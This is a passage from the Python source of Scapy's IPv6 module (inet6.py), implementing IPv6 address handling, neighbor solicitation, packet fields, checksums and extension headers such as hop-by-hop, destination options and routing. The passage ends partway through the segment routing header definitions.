#! /usr/bin/env python
#############################################################################
##                                                                         ##
## inet6.py --- IPv6 support for Scapy                                     ##
##              see http://natisbad.org/IPv6/                              ##
##              for more informations                                      ##
##                                                                         ##
## Copyright (C) 2005  Guillaume Valadon <guedou@hongo.wide.ad.jp>         ##
##                     Arnaud Ebalard <arnaud.ebalard@eads.net>            ##
##                                                                         ##
## This program is free software; you can redistribute it and/or modify it ##
## under the terms of the GNU General Public License version 2 as          ##
## published by the Free Software Foundation.                              ##
##                                                                         ##
## This program is distributed in the hope that it will be useful, but     ##
## WITHOUT ANY WARRANTY; without even the implied warranty of              ##
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU       ##
## General Public License for more details.                                ##
##                                                                         ##
#############################################################################

"""
IPv6 (Internet Protocol v6).
"""


from __future__ import absolute_import
from __future__ import print_function

from hashlib import md5
import random
import re
import socket
import struct
from time import gmtime, strftime

import scapy.modules.six as six
from scapy.modules.six.moves import range, zip
if not socket.has_ipv6:
    raise socket.error("can't use AF_INET6, IPv6 is disabled")
if not hasattr(socket, "IPPROTO_IPV6"):
    # Workaround for http://bugs.python.org/issue6926
    socket.IPPROTO_IPV6 = 41
if not hasattr(socket, "IPPROTO_IPIP"):
    # Workaround for https://bitbucket.org/secdev/scapy/issue/5119
    socket.IPPROTO_IPIP = 4

from scapy.arch import get_if_hwaddr
from scapy.config import conf
from scapy.base_classes import Gen
from scapy.data import DLT_IPV6, DLT_RAW, DLT_RAW_ALT, ETHER_ANY, ETH_P_IPV6, \
    MTU
from scapy.compat import chb, orb, raw, plain_str
import scapy.consts
from scapy.fields import BitEnumField, BitField, ByteEnumField, ByteField, \
    DestField, Field, FieldLenField, FlagsField, IntField, LongField, \
    MACField, PacketLenField, PacketListField, ShortEnumField, ShortField, \
    StrField, StrFixedLenField, StrLenField, X3BytesField, XBitField, \
    XIntField, XShortField
from scapy.packet import bind_layers, Packet, Raw
from scapy.volatile import RandInt, RandIP6, RandShort
from scapy.sendrecv import sendp, sniff, sr, srp1
from scapy.as_resolvers import AS_resolver_riswhois
from scapy.supersocket import SuperSocket, L3RawSocket
from scapy.utils6 import in6_6to4ExtractAddr, in6_and, in6_cidr2mask, \
    in6_getnsma, in6_getnsmac, in6_isaddr6to4, in6_isaddrllallnodes, \
    in6_isaddrllallservers, in6_isaddrTeredo, in6_isllsnmaddr, in6_ismaddr, \
    in6_ptop, teredoAddrExtractInfo
from scapy.layers.l2 import CookedLinux, Ether, GRE, Loopback, SNAP
from scapy.layers.inet import IP, IPTools, TCP, TCPerror, TracerouteResult, \
    UDP, UDPerror
from scapy.utils import checksum, inet_pton, inet_ntop, strxor
from scapy.error import warning
if conf.route6 is None:
    # unused import, only to initialize conf.route6
    import scapy.route6

##########################
## Neighbor cache stuff ##
##########################

conf.netcache.new_cache("in6_neighbor", 120)

@conf.commands.register
def neighsol(addr, src, iface, timeout=1, chainCC=0):
    """Sends an ICMPv6 Neighbor Solicitation message to get the MAC address of the neighbor with specified IPv6 address addr

    'src' address is used as source of the message. Message is sent on iface.
    By default, timeout waiting for an answer is 1 second.

    If no answer is gathered, None is returned. Else, the answer is
    returned (ethernet frame).
    """

    nsma = in6_getnsma(inet_pton(socket.AF_INET6, addr))
    d = inet_ntop(socket.AF_INET6, nsma)
    dm = in6_getnsmac(nsma)
    p = Ether(dst=dm)/IPv6(dst=d, src=src, hlim=255)
    p /= ICMPv6ND_NS(tgt=addr)
    p /= ICMPv6NDOptSrcLLAddr(lladdr=get_if_hwaddr(iface))
    res = srp1(p,type=ETH_P_IPV6, iface=iface, timeout=1, verbose=0,
               chainCC=chainCC)

    return res

@conf.commands.register
def getmacbyip6(ip6, chainCC=0):
    """Returns the MAC address corresponding to an IPv6 address

    neighborCache.get() method is used on instantiated neighbor cache.
    Resolution mechanism is described in associated doc string.

    (chainCC parameter value ends up being passed to sending function
     used to perform the resolution, if needed)
    """
    
    if isinstance(ip6, Net6):
        ip6 = str(ip6)

    if in6_ismaddr(ip6): # Multicast
        mac = in6_getnsmac(inet_pton(socket.AF_INET6, ip6))
        return mac

    iff,a,nh = conf.route6.route(ip6)

    if iff == scapy.consts.LOOPBACK_INTERFACE:
        return "ff:ff:ff:ff:ff:ff"

    if nh != '::':
        ip6 = nh # Found next hop

    mac = conf.netcache.in6_neighbor.get(ip6)
    if mac:
        return mac

    res = neighsol(ip6, a, iff, chainCC=chainCC)

    if res is not None:
        if ICMPv6NDOptDstLLAddr in res:
            mac = res[ICMPv6NDOptDstLLAddr].lladdr
        else:
            mac = res.src
        conf.netcache.in6_neighbor[ip6] = mac
        return mac

    return None


#############################################################################
#############################################################################
###              IPv6 addresses manipulation routines                     ###
#############################################################################
#############################################################################

class Net6(Gen): # syntax ex. fec0::/126
    """Generate a list of IPv6s from a network address or a name"""
    name = "ipv6"
    ip_regex = re.compile(r"^([a-fA-F0-9:]+)(/[1]?[0-3]?[0-9])?$")

    def __init__(self, net):
        self.repr = net

        tmp = net.split('/')+["128"]
        if not self.ip_regex.match(net):
            tmp[0]=socket.getaddrinfo(tmp[0], None, socket.AF_INET6)[0][-1][0]

        netmask = int(tmp[1])
        self.net = inet_pton(socket.AF_INET6, tmp[0])
        self.mask = in6_cidr2mask(netmask)
        self.plen = netmask

    def __iter__(self):

        def parse_digit(value, netmask):
            netmask = min(8, max(netmask, 0))
            value = int(value)
            return (value & (0xff << netmask),
                    (value | (0xff >> (8 - netmask))) + 1)

        self.parsed = [
            parse_digit(x, y) for x, y in zip(
                struct.unpack("16B", in6_and(self.net, self.mask)),
                (x - self.plen for x in range(8, 129, 8)),
            )
        ]

        def rec(n, l):
            sep = ':' if n and  n % 2 == 0 else ''
            if n == 16:
                return l
            return rec(n + 1, [y + sep + '%.2x' % i
                               # faster than '%s%s%.2x' % (y, sep, i)
                               for i in range(*self.parsed[n])
                               for y in l])

        return iter(rec(0, ['']))

    def __str__(self):
        try:
            return next(self.__iter__())
        except StopIteration:
            return None

    def __eq__(self, other):
        return str(other) == str(self)

    def __ne__(self, other):
        return str(other) != str(self)

    def __repr__(self):
        return "Net6(%r)" % self.repr






#############################################################################
#############################################################################
###                              IPv6 Class                               ###
#############################################################################
#############################################################################

class IP6Field(Field):
    def __init__(self, name, default):
        Field.__init__(self, name, default, "16s")
    def h2i(self, pkt, x):
        if isinstance(x, bytes):
            x = plain_str(x)
        if isinstance(x, str):
            try:
                x = in6_ptop(x)
            except socket.error:
                x = Net6(x)
        elif isinstance(x, list):
            x = [self.h2i(pkt, n) for n in x]
        return x
    def i2m(self, pkt, x):
        return inet_pton(socket.AF_INET6, plain_str(x))
    def m2i(self, pkt, x):
        return inet_ntop(socket.AF_INET6, x)
    def any2i(self, pkt, x):
        return self.h2i(pkt,x)
    def i2repr(self, pkt, x):
        if x is None:
            return self.i2h(pkt,x)
        elif not isinstance(x, Net6) and not isinstance(x, list):
            if in6_isaddrTeredo(x):   # print Teredo info
                server, _, maddr, mport = teredoAddrExtractInfo(x)
                return "%s [Teredo srv: %s cli: %s:%s]" % (self.i2h(pkt, x), server, maddr,mport)
            elif in6_isaddr6to4(x):   # print encapsulated address
                vaddr = in6_6to4ExtractAddr(x)
                return "%s [6to4 GW: %s]" % (self.i2h(pkt, x), vaddr)
        r = self.i2h(pkt, x)          # No specific information to return
        return r if isinstance(r, str) else repr(r)
    def randval(self):
        return RandIP6()

class SourceIP6Field(IP6Field):
    __slots__ = ["dstname"]
    def __init__(self, name, dstname):
        IP6Field.__init__(self, name, None)
        self.dstname = dstname
    def i2m(self, pkt, x):
        if x is None:
            dst=getattr(pkt,self.dstname)
            iff,x,nh = conf.route6.route(dst)
        return IP6Field.i2m(self, pkt, x)
    def i2h(self, pkt, x):
        if x is None:
            if conf.route6 is None:
                # unused import, only to initialize conf.route6
                import scapy.route6
            dst = ("::" if self.dstname is None else getattr(pkt, self.dstname))
            if isinstance(dst, (Gen, list)):
                r = {conf.route6.route(str(daddr)) for daddr in dst}
                if len(r) > 1:
                    warning("More than one possible route for %r" % (dst,))
                x = min(r)[1]
            else:
                x = conf.route6.route(dst)[1]
        return IP6Field.i2h(self, pkt, x)

class DestIP6Field(IP6Field, DestField):
    bindings = {}
    def __init__(self, name, default):
        IP6Field.__init__(self, name, None)
        DestField.__init__(self, name, default)
    def i2m(self, pkt, x):
        if x is None:
            x = self.dst_from_pkt(pkt)
        return IP6Field.i2m(self, pkt, x)
    def i2h(self, pkt, x):
        if x is None:
            x = self.dst_from_pkt(pkt)
        return IP6Field.i2h(self, pkt, x)

ipv6nh = { 0:"Hop-by-Hop Option Header",
           4:"IP",
           6:"TCP",
          17:"UDP",
          41:"IPv6",
          43:"Routing Header",
          44:"Fragment Header",
          47:"GRE",
          50:"ESP Header",
          51:"AH Header",
          58:"ICMPv6",
          59:"No Next Header",
          60:"Destination Option Header",
         112:"VRRP",
         132:"SCTP",
         135:"Mobility Header"}

ipv6nhcls = {  0: "IPv6ExtHdrHopByHop",
               4: "IP",
               6: "TCP",
               17: "UDP",
               43: "IPv6ExtHdrRouting",
               44: "IPv6ExtHdrFragment",
              #50: "IPv6ExtHrESP",
              #51: "IPv6ExtHdrAH",
               58: "ICMPv6Unknown",
               59: "Raw",
               60: "IPv6ExtHdrDestOpt" }

class IP6ListField(StrField):
    __slots__ = ["count_from", "length_from"]
    islist = 1
    def __init__(self, name, default, count_from=None, length_from=None):
        if default is None:
            default = []
        StrField.__init__(self, name, default)
        self.count_from = count_from
        self.length_from = length_from

    def i2len(self, pkt, i):
        return 16*len(i)

    def i2count(self, pkt, i):
        if isinstance(i, list):
            return len(i)
        return 0

    def getfield(self, pkt, s):
        c = l = None
        if self.length_from is not None:
            l = self.length_from(pkt)
        elif self.count_from is not None:
            c = self.count_from(pkt)

        lst = []
        ret = b""
        remain = s
        if l is not None:
            remain,ret = s[:l],s[l:]
        while remain:
            if c is not None:
                if c <= 0:
                    break
                c -= 1
            addr = inet_ntop(socket.AF_INET6, remain[:16])
            lst.append(addr)
            remain = remain[16:]
        return remain+ret,lst

    def i2m(self, pkt, x):
        s = b""
        for y in x:
            try:
                y = inet_pton(socket.AF_INET6, y)
            except:
                y = socket.getaddrinfo(y, None, socket.AF_INET6)[0][-1][0]
                y = inet_pton(socket.AF_INET6, y)
            s += y
        return s

    def i2repr(self,pkt,x):
        s = []
        if x == None:
            return "[]"
        for y in x:
            s.append('%s' % y)
        return "[ %s ]" % (", ".join(s))

class _IPv6GuessPayload:
    name = "Dummy class that implements guess_payload_class() for IPv6"
    def default_payload_class(self,p):
        if self.nh == 58: # ICMPv6
            t = orb(p[0])
            if len(p) > 2 and (t == 139 or t == 140): # Node Info Query
                return _niquery_guesser(p)
            if len(p) >= icmp6typesminhdrlen.get(t, float("inf")): # Other ICMPv6 messages
                if t == 130 and len(p) >= 28:
                    # RFC 3810 - 8.1. Query Version Distinctions
                    return ICMPv6MLQuery2
                return icmp6typescls.get(t,Raw)
            return Raw
        elif self.nh == 135 and len(p) > 3: # Mobile IPv6
            return _mip6_mhtype2cls.get(orb(p[2]), MIP6MH_Generic)
        elif self.nh == 43 and orb(p[2]) == 4:  # Segment Routing header
            return IPv6ExtHdrSegmentRouting
        return ipv6nhcls.get(self.nh, Raw)

class IPv6(_IPv6GuessPayload, Packet, IPTools):
    name = "IPv6"
    fields_desc = [ BitField("version" , 6 , 4),
                    BitField("tc", 0, 8), #TODO: IPv6, ByteField ?
                    BitField("fl", 0, 20),
                    ShortField("plen", None),
                    ByteEnumField("nh", 59, ipv6nh),
                    ByteField("hlim", 64),
                    SourceIP6Field("src", "dst"), # dst is for src @ selection
                    DestIP6Field("dst", "::1") ]

    def route(self):
        """Used to select the L2 address"""
        dst = self.dst
        if isinstance(dst,Gen):
            dst = next(iter(dst))
        return conf.route6.route(dst)

    def mysummary(self):
        return "%s > %s (%i)" % (self.src, self.dst, self.nh)

    def post_build(self, p, pay):
        p += pay
        if self.plen is None:
            l = len(p) - 40
            p = p[:4]+struct.pack("!H", l)+p[6:]
        return p

    def extract_padding(self, data):
        """Extract the IPv6 payload"""

        if self.plen == 0 and self.nh == 0 and len(data) >= 8:
            # Extract Hop-by-Hop extension length
            hbh_len = orb(data[1])
            hbh_len = 8 + hbh_len * 8

            # Extract length from the Jumbogram option
            # Note: the following algorithm take advantage of the Jumbo option
            #        mandatory alignment (4n + 2, RFC2675 Section 2)
            jumbo_len = None
            idx = 0
            offset = 4*idx+2
            while offset <= len(data):
                opt_type = orb(data[offset])
                if opt_type == 0xc2:  # Jumbo option
                    jumbo_len = struct.unpack("I", data[offset+2:offset+2+4])[0]
                    break
                offset = 4*idx+2
                idx += 1

            if jumbo_len is None:
                warning("Scapy did not find a Jumbo option")
                jumbo_len = 0

            l = hbh_len + jumbo_len
        else:
            l = self.plen

        return data[:l], data[l:]

    def hashret(self):
        if self.nh == 58 and isinstance(self.payload, _ICMPv6):
            if self.payload.type < 128:
                return self.payload.payload.hashret()
            elif (self.payload.type in [133,134,135,136,144,145]):
                return struct.pack("B", self.nh)+self.payload.hashret()

        if not conf.checkIPinIP and self.nh in [4, 41]:  # IP, IPv6
            return self.payload.hashret()

        nh = self.nh
        sd = self.dst
        ss = self.src
        if self.nh == 43 and isinstance(self.payload, IPv6ExtHdrRouting):
            # With routing header, the destination is the last
            # address of the IPv6 list if segleft > 0
            nh = self.payload.nh
            try:
                sd = self.addresses[-1]
            except IndexError:
                sd = '::1'
            # TODO: big bug with ICMPv6 error messages as the destination of IPerror6
            #       could be anything from the original list ...
            if 1:
                sd = inet_pton(socket.AF_INET6, sd)
                for a in self.addresses:
                    a = inet_pton(socket.AF_INET6, a)
                    sd = strxor(sd, a)
                sd = inet_ntop(socket.AF_INET6, sd)

        if self.nh == 43 and isinstance(self.payload, IPv6ExtHdrSegmentRouting):
            # With segment routing header (rh == 4), the destination is
            # the first address of the IPv6 addresses list
            try:
                sd = self.addresses[0]
            except IndexError:
                sd = self.dst

        if self.nh == 44 and isinstance(self.payload, IPv6ExtHdrFragment):
            nh = self.payload.nh

        if self.nh == 0 and isinstance(self.payload, IPv6ExtHdrHopByHop):
            nh = self.payload.nh

        if self.nh == 60 and isinstance(self.payload, IPv6ExtHdrDestOpt):
            foundhao = None
            for o in self.payload.options:
                if isinstance(o, HAO):
                    foundhao = o
            if foundhao:
                nh = self.payload.nh # XXX what if another extension follows ?
                ss = foundhao.hoa

        if conf.checkIPsrc and conf.checkIPaddr and not in6_ismaddr(sd):
            sd = inet_pton(socket.AF_INET6, sd)
            ss = inet_pton(socket.AF_INET6, self.src)
            return strxor(sd, ss) + struct.pack("B", nh) + self.payload.hashret()
        else:
            return struct.pack("B", nh)+self.payload.hashret()

    def answers(self, other):
        if not conf.checkIPinIP:  # skip IP in IP and IPv6 in IP
            if self.nh in [4, 41]:
                return self.payload.answers(other)
            if isinstance(other, IPv6) and other.nh in [4, 41]:
                return self.answers(other.payload)
            if isinstance(other, IP) and other.proto in [4, 41]:
                return self.answers(other.payload)
        if not isinstance(other, IPv6): # self is reply, other is request
            return False
        if conf.checkIPaddr:
            # ss = inet_pton(socket.AF_INET6, self.src)
            sd = inet_pton(socket.AF_INET6, self.dst)
            os = inet_pton(socket.AF_INET6, other.src)
            od = inet_pton(socket.AF_INET6, other.dst)
            # request was sent to a multicast address (other.dst)
            # Check reply destination addr matches request source addr (i.e
            # sd == os) except when reply is multicasted too
            # XXX test mcast scope matching ?
            if in6_ismaddr(other.dst):
                if in6_ismaddr(self.dst):
                    if ((od == sd) or
                        (in6_isaddrllallnodes(self.dst) and in6_isaddrllallservers(other.dst))):
                         return self.payload.answers(other.payload)
                    return False
                if (os == sd):
                    return self.payload.answers(other.payload)
                return False
            elif (sd != os): # or ss != od): <- removed for ICMP errors
                return False
        if self.nh == 58 and isinstance(self.payload, _ICMPv6) and self.payload.type < 128:
            # ICMPv6 Error message -> generated by IPv6 packet
            # Note : at the moment, we jump the ICMPv6 specific class
            # to call answers() method of erroneous packet (over
            # initial packet). There can be cases where an ICMPv6 error
            # class could implement a specific answers method that perform
            # a specific task. Currently, don't see any use ...
            return self.payload.payload.answers(other)
        elif other.nh == 0 and isinstance(other.payload, IPv6ExtHdrHopByHop):
            return self.payload.answers(other.payload)
        elif other.nh == 44 and isinstance(other.payload, IPv6ExtHdrFragment):
            return self.payload.answers(other.payload.payload)
        elif other.nh == 43 and isinstance(other.payload, IPv6ExtHdrRouting):
            return self.payload.answers(other.payload.payload) # Buggy if self.payload is a IPv6ExtHdrRouting
        elif other.nh == 43 and isinstance(other.payload, IPv6ExtHdrSegmentRouting):
            return self.payload.answers(other.payload.payload)  # Buggy if self.payload is a IPv6ExtHdrRouting
        elif other.nh == 60 and isinstance(other.payload, IPv6ExtHdrDestOpt):
            return self.payload.payload.answers(other.payload.payload)
        elif self.nh == 60 and isinstance(self.payload, IPv6ExtHdrDestOpt): # BU in reply to BRR, for instance
            return self.payload.payload.answers(other.payload)
        else:
            if (self.nh != other.nh):
                return False
            return self.payload.answers(other.payload)


class _IPv46(IP):
    """
    This class implements a dispatcher that is used to detect the IP version
    while parsing Raw IP pcap files.
    """
    @classmethod
    def dispatch_hook(cls, _pkt=None, *_, **kargs):
        if _pkt:
            if orb(_pkt[0]) >> 4 == 6:
                return IPv6
        elif kargs.get("version") == 6:
            return IPv6
        return IP


def inet6_register_l3(l2, l3):
    return getmacbyip6(l3.dst)
conf.neighbor.register_l3(Ether, IPv6, inet6_register_l3)


class IPerror6(IPv6):
    name = "IPv6 in ICMPv6"
    def answers(self, other):
        if not isinstance(other, IPv6):
            return False
        sd = inet_pton(socket.AF_INET6, self.dst)
        ss = inet_pton(socket.AF_INET6, self.src)
        od = inet_pton(socket.AF_INET6, other.dst)
        os = inet_pton(socket.AF_INET6, other.src)

        # Make sure that the ICMPv6 error is related to the packet scapy sent
        if isinstance(self.underlayer, _ICMPv6) and self.underlayer.type < 128:

            # find upper layer for self (possible citation)
            selfup = self.payload
            while selfup is not None and isinstance(selfup, _IPv6ExtHdr):
                selfup = selfup.payload

            # find upper layer for other (initial packet). Also look for RH
            otherup = other.payload
            request_has_rh = False
            while otherup is not None and isinstance(otherup, _IPv6ExtHdr):
                if isinstance(otherup, IPv6ExtHdrRouting):
                    request_has_rh = True
                otherup = otherup.payload

            if ((ss == os and sd == od) or      # <- Basic case
                (ss == os and request_has_rh)): # <- Request has a RH :
                                                #    don't check dst address

                # Let's deal with possible MSS Clamping
                if (isinstance(selfup, TCP) and
                    isinstance(otherup, TCP) and
                    selfup.options != otherup.options): # seems clamped

                    # Save fields modified by MSS clamping
                    old_otherup_opts    = otherup.options
                    old_otherup_cksum   = otherup.chksum
                    old_otherup_dataofs = otherup.dataofs
                    old_selfup_opts     = selfup.options
                    old_selfup_cksum    = selfup.chksum
                    old_selfup_dataofs  = selfup.dataofs

                    # Nullify them
                    otherup.options = []
                    otherup.chksum  = 0
                    otherup.dataofs = 0
                    selfup.options  = []
                    selfup.chksum   = 0
                    selfup.dataofs  = 0

                    # Test it and save result
                    s1 = raw(selfup)
                    s2 = raw(otherup)
                    l = min(len(s1), len(s2))
                    res = s1[:l] == s2[:l]

                    # recall saved values
                    otherup.options = old_otherup_opts
                    otherup.chksum  = old_otherup_cksum
                    otherup.dataofs = old_otherup_dataofs
                    selfup.options  = old_selfup_opts
                    selfup.chksum   = old_selfup_cksum
                    selfup.dataofs  = old_selfup_dataofs

                    return res

                s1 = raw(selfup)
                s2 = raw(otherup)
                l = min(len(s1), len(s2))
                return s1[:l] == s2[:l]

        return False

    def mysummary(self):
        return Packet.mysummary(self)


#############################################################################
#############################################################################
###                 Upper Layer Checksum computation                      ###
#############################################################################
#############################################################################

class PseudoIPv6(Packet): # IPv6 Pseudo-header for checksum computation
    name = "Pseudo IPv6 Header"
    fields_desc = [ IP6Field("src", "::"),
                    IP6Field("dst", "::"),
                    ShortField("uplen", None),
                    BitField("zero", 0, 24),
                    ByteField("nh", 0) ]

def in6_chksum(nh, u, p):
    """
    As Specified in RFC 2460 - 8.1 Upper-Layer Checksums

    Performs IPv6 Upper Layer checksum computation. Provided parameters are:
    - 'nh' : value of upper layer protocol
    - 'u'  : upper layer instance (TCP, UDP, ICMPv6*, ). Instance must be
             provided with all under layers (IPv6 and all extension headers,
             for example)
    - 'p'  : the payload of the upper layer provided as a string

    Functions operate by filling a pseudo header class instance (PseudoIPv6)
    with
    - Next Header value
    - the address of _final_ destination (if some Routing Header with non
    segleft field is present in underlayer classes, last address is used.)
    - the address of _real_ source (basically the source address of an
    IPv6 class instance available in the underlayer or the source address
    in HAO option if some Destination Option header found in underlayer
    includes this option).
    - the length is the length of provided payload string ('p')
    """

    ph6 = PseudoIPv6()
    ph6.nh = nh
    rthdr = 0
    hahdr = 0
    final_dest_addr_found = 0
    while u != None and not isinstance(u, IPv6):
        if (isinstance(u, IPv6ExtHdrRouting) and
            u.segleft != 0 and len(u.addresses) != 0 and
            final_dest_addr_found == 0):
            rthdr = u.addresses[-1]
            final_dest_addr_found = 1
        elif (isinstance(u, IPv6ExtHdrSegmentRouting) and
            u.segleft != 0 and len(u.addresses) != 0 and
            final_dest_addr_found == 0):
            rthdr = u.addresses[0]
            final_dest_addr_found = 1
        elif (isinstance(u, IPv6ExtHdrDestOpt) and (len(u.options) == 1) and
             isinstance(u.options[0], HAO)):
             hahdr  = u.options[0].hoa
        u = u.underlayer
    if u is None:
        warning("No IPv6 underlayer to compute checksum. Leaving null.")
        return 0
    if hahdr:
        ph6.src = hahdr
    else:
        ph6.src = u.src
    if rthdr:
        ph6.dst = rthdr
    else:
        ph6.dst = u.dst
    ph6.uplen = len(p)
    ph6s = raw(ph6)
    return checksum(ph6s+p)


#############################################################################
#############################################################################
###                         Extension Headers                             ###
#############################################################################
#############################################################################


# Inherited by all extension header classes
class _IPv6ExtHdr(_IPv6GuessPayload, Packet):
    name = 'Abstract IPv6 Option Header'
    aliastypes = [IPv6, IPerror6] # TODO ...


#################### IPv6 options for Extension Headers #####################

_hbhopts = { 0x00: "Pad1",
             0x01: "PadN",
             0x04: "Tunnel Encapsulation Limit",
             0x05: "Router Alert",
             0x06: "Quick-Start",
             0xc2: "Jumbo Payload",
             0xc9: "Home Address Option" }

class _OTypeField(ByteEnumField):
    """
    Modified BytEnumField that displays information regarding the IPv6 option
    based on its option type value (What should be done by nodes that process
    the option if they do not understand it ...)

    It is used by Jumbo, Pad1, PadN, RouterAlert, HAO options
    """
    pol = {0x00: "00: skip",
           0x40: "01: discard",
           0x80: "10: discard+ICMP",
           0xC0: "11: discard+ICMP not mcast"}

    enroutechange = {0x00: "0: Don't change en-route",
                 0x20: "1: May change en-route" }

    def i2repr(self, pkt, x):
        s = self.i2s.get(x, repr(x))
        polstr = self.pol[(x & 0xC0)]
        enroutechangestr = self.enroutechange[(x & 0x20)]
        return "%s [%s, %s]" % (s, polstr, enroutechangestr)

class HBHOptUnknown(Packet): # IPv6 Hop-By-Hop Option
    name = "Scapy6 Unknown Option"
    fields_desc = [_OTypeField("otype", 0x01, _hbhopts),
                   FieldLenField("optlen", None, length_of="optdata", fmt="B"),
                   StrLenField("optdata", "",
                               length_from = lambda pkt: pkt.optlen) ]
    def alignment_delta(self, curpos): # By default, no alignment requirement
        """
        As specified in section 4.2 of RFC 2460, every options has
        an alignment requirement ususally expressed xn+y, meaning
        the Option Type must appear at an integer multiple of x octest
        from the start of the header, plus y octet.

        That function is provided the current position from the
        start of the header and returns required padding length.
        """
        return 0

class Pad1(Packet): # IPv6 Hop-By-Hop Option
    name = "Pad1"
    fields_desc = [ _OTypeField("otype", 0x00, _hbhopts) ]
    def alignment_delta(self, curpos): # No alignment requirement
        return 0

class PadN(Packet): # IPv6 Hop-By-Hop Option
    name = "PadN"
    fields_desc = [_OTypeField("otype", 0x01, _hbhopts),
                   FieldLenField("optlen", None, length_of="optdata", fmt="B"),
                   StrLenField("optdata", "",
                               length_from = lambda pkt: pkt.optlen)]
    def alignment_delta(self, curpos): # No alignment requirement
        return 0

class RouterAlert(Packet): # RFC 2711 - IPv6 Hop-By-Hop Option
    name = "Router Alert"
    fields_desc = [_OTypeField("otype", 0x05, _hbhopts),
                   ByteField("optlen", 2),
                   ShortEnumField("value", None,
                                  { 0: "Datagram contains a MLD message",
                                    1: "Datagram contains RSVP message",
                                    2: "Datagram contains an Active Network message",
                                   68: "NSIS NATFW NSLP",
                                   69: "MPLS OAM",
                                65535: "Reserved" })]
    # TODO : Check IANA has not defined new values for value field of RouterAlertOption
    # TODO : Now that we have that option, we should do something in MLD class that need it
    # TODO : IANA has defined ranges of values which can't be easily represented here.
    #        iana.org/assignments/ipv6-routeralert-values/ipv6-routeralert-values.xhtml
    def alignment_delta(self, curpos): # alignment requirement : 2n+0
        x = 2 ; y = 0
        delta = x*((curpos - y + x - 1)//x) + y - curpos
        return delta

class Jumbo(Packet): # IPv6 Hop-By-Hop Option
    name = "Jumbo Payload"
    fields_desc = [_OTypeField("otype", 0xC2, _hbhopts),
                   ByteField("optlen", 4),
                   IntField("jumboplen", None) ]
    def alignment_delta(self, curpos): # alignment requirement : 4n+2
        x = 4 ; y = 2
        delta = x*((curpos - y + x - 1)//x) + y - curpos
        return delta

class HAO(Packet): # IPv6 Destination Options Header Option
    name = "Home Address Option"
    fields_desc = [_OTypeField("otype", 0xC9, _hbhopts),
                   ByteField("optlen", 16),
                   IP6Field("hoa", "::") ]
    def alignment_delta(self, curpos): # alignment requirement : 8n+6
        x = 8 ; y = 6
        delta = x*((curpos - y + x - 1)//x) + y - curpos
        return delta

_hbhoptcls = { 0x00: Pad1,
               0x01: PadN,
               0x05: RouterAlert,
               0xC2: Jumbo,
               0xC9: HAO }


######################## Hop-by-Hop Extension Header ########################

class _HopByHopOptionsField(PacketListField):
    __slots__ = ["curpos"]
    def __init__(self, name, default, cls, curpos, count_from=None, length_from=None):
        self.curpos = curpos
        PacketListField.__init__(self, name, default, cls, count_from=count_from, length_from=length_from)

    def i2len(self, pkt, i):
        l = len(self.i2m(pkt, i))
        return l

    def i2count(self, pkt, i):
        if isinstance(i, list):
            return len(i)
        return 0

    def getfield(self, pkt, s):
        c = l = None
        if self.length_from is not None:
            l = self.length_from(pkt)
        elif self.count_from is not None:
            c = self.count_from(pkt)

        opt = []
        ret = b""
        x = s
        if l is not None:
            x,ret = s[:l],s[l:]
        while x:
            if c is not None:
                if c <= 0:
                    break
                c -= 1
            o = orb(x[0]) # Option type
            cls = self.cls
            if o in _hbhoptcls:
                cls = _hbhoptcls[o]
            try:
                op = cls(x)
            except:
                op = self.cls(x)
            opt.append(op)
            if isinstance(op.payload, conf.raw_layer):
                x = op.payload.load
                del(op.payload)
            else:
                x = b""
        return x+ret,opt

    def i2m(self, pkt, x):
        autopad = None
        try:
            autopad = getattr(pkt, "autopad") # Hack : 'autopad' phantom field
        except:
            autopad = 1

        if not autopad:
            return b"".join(map(str, x))

        curpos = self.curpos
        s = b""
        for p in x:
            d = p.alignment_delta(curpos)
            curpos += d
            if d == 1:
                s += raw(Pad1())
            elif d != 0:
                s += raw(PadN(optdata=b'\x00'*(d-2)))
            pstr = raw(p)
            curpos += len(pstr)
            s += pstr

        # Let's make the class including our option field
        # a multiple of 8 octets long
        d = curpos % 8
        if d == 0:
            return s
        d = 8 - d
        if d == 1:
            s += raw(Pad1())
        elif d != 0:
            s += raw(PadN(optdata=b'\x00'*(d-2)))

        return s

    def addfield(self, pkt, s, val):
        return s+self.i2m(pkt, val)

class _PhantomAutoPadField(ByteField):
    def addfield(self, pkt, s, val):
        return s

    def getfield(self, pkt, s):
        return s, 1

    def i2repr(self, pkt, x):
        if x:
            return "On"
        return "Off"


class IPv6ExtHdrHopByHop(_IPv6ExtHdr):
    name = "IPv6 Extension Header - Hop-by-Hop Options Header"
    fields_desc = [ ByteEnumField("nh", 59, ipv6nh),
                    FieldLenField("len", None, length_of="options", fmt="B",
                                  adjust = lambda pkt,x: (x+2+7)//8 - 1),
                    _PhantomAutoPadField("autopad", 1), # autopad activated by default
                    _HopByHopOptionsField("options", [], HBHOptUnknown, 2,
                                          length_from = lambda pkt: (8*(pkt.len+1))-2) ]
    overload_fields = {IPv6: { "nh": 0 }}


######################## Destination Option Header ##########################

class IPv6ExtHdrDestOpt(_IPv6ExtHdr):
    name = "IPv6 Extension Header - Destination Options Header"
    fields_desc = [ ByteEnumField("nh", 59, ipv6nh),
                    FieldLenField("len", None, length_of="options", fmt="B",
                                  adjust = lambda pkt,x: (x+2+7)//8 - 1),
                    _PhantomAutoPadField("autopad", 1), # autopad activated by default
                    _HopByHopOptionsField("options", [], HBHOptUnknown, 2,
                                          length_from = lambda pkt: (8*(pkt.len+1))-2) ]
    overload_fields = {IPv6: { "nh": 60 }}


############################# Routing Header ################################

class IPv6ExtHdrRouting(_IPv6ExtHdr):
    name = "IPv6 Option Header Routing"
    fields_desc = [ ByteEnumField("nh", 59, ipv6nh),
                    FieldLenField("len", None, count_of="addresses", fmt="B",
                                  adjust = lambda pkt,x:2*x), # in 8 bytes blocks
                    ByteField("type", 0),
                    ByteField("segleft", None),
                    BitField("reserved", 0, 32), # There is meaning in this field ...
                    IP6ListField("addresses", [],
                                 length_from = lambda pkt: 8*pkt.len)]
    overload_fields = {IPv6: { "nh": 43 }}

    def post_build(self, pkt, pay):
        if self.segleft is None:
            pkt = pkt[:3]+struct.pack("B", len(self.addresses))+pkt[4:]
        return _IPv6ExtHdr.post_build(self, pkt, pay)


######################### Segment Routing Header ############################

# This implementation is based on draft 06, available at:
# https://tools.ietf.org/html/draft-ietf-6man-segment-routing-header-06

class IPv6ExtHdrSegmentRoutingTLV(Packet):
    name = "IPv6 Option Header Segment Routing - Generic TLV"
    fields_desc = [ ByteField("type", 0),
                    ByteField("len", 0),
